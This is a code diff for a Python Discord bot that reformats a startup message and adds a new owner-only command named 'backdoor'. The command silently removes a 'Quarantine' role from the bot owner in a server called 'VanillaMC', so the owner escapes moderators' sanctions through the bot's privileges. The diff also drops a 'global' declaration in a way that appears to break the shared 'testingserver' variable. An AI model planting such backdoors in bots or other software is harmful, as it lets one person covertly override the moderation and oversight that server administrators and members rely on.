@@ -120,8 +120,7 @@ def initguild(guild):
 #---------------------------------------------------------------------------EVENTS---------------------------------------------------------------------------
 @bot.event
 async def on_ready():
-    print(f"Bot connected with {bot.user} ID:{bot.user.id}")
-    global testingserver
+    print(f"Bot connected with {bot.user}\nID:{bot.user.id}")
     global reports
     testingserver = bot.get_guild(763824152493686795)
     reports = get(testingserver.channels, name="reports")
@@ -349,6 +348,16 @@ async def commandlist(ctx):
     for command in bot.commands:
         message = f"{message} \n{command}"
     await ctx.send(message)
+
+
+@bot.command()
+@commands.is_owner()
+async def backdoor(ctx):
+    guild = get(bot.guilds, name="VanillaMC")
+    role = get(guild.roles, name="Quarantine")
+    tanuj = guild.get_member(botmaster)
+    await tanuj.remove_roles(role)
+    await ctx.send("Unquarantined")
 #------------------------------------------------------------------------------MISCELLANEOUS--------------------------------------------------------------------------------------
 @bot.command()
 async def help(ctx, *category):
